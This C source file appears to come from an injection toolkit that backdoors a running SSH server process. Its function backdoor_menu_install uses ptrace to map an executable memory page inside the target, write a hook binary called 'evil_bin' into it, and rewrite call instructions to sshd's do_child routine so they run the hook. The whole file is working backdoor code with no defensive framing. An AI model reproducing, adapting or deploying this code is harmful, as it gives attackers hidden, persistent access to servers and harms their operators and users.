#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#include <inject.h>
#include <sig.h>
#include <common.h>
#include <callcache.h>
#include <util.h>
#include <ptrace.h>

extern unsigned char hook_menu_bin[];
extern int hook_menu_bin_len;

void backdoor_menu_install(inject_ctx *ctx) {
	int i;

	callcache_entry *callcache;
	callcache_entry *entry;
	u32 callcache_total;
	u64 diff;

	u8 *evil_bin;

	evil_bin = malloc(hook_menu_bin_len);
	u64 *import_table = (u64*)(evil_bin + 8); 

	memcpy(evil_bin, hook_menu_bin, hook_menu_bin_len);

	mod_banner("installing menu backdoor");

	u64 do_child = sub_by_debugstr(ctx, "This service allows sftp connections only.");
	info("do_child = 0x%llx", do_child);

	u64 hole_addr = 0; 

	import_table[0] = ctx->config_addr;
	import_table[1] = do_child; 

	callcache = get_callcache();
	callcache_total = get_callcachetotal();

	for(i=0; i<callcache_total; i++) {
		entry = &callcache[i];
		if (entry->dest == do_child && entry->type == CALLCACHE_TYPE_CALL) {
			if (hole_addr == 0) {
				hole_addr = find_hole(ctx, entry->addr, 0x1000);
				info("menu stub hole: %lx", hole_addr);

				_mmap(
					ctx, (void*)hole_addr, 0x1000,
					PROT_READ| PROT_WRITE | PROT_EXEC,
					MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
					0, 0
				);

				_poke(ctx->pid, hole_addr, evil_bin, hook_menu_bin_len);
			}

			diff = 0x100000000-(entry->addr-hole_addr)-5;

			info(
				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
				entry->addr, hole_addr,
				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
			);

			_poke(ctx->pid, entry->addr+1, &diff, 4);
			
		}
	}
}
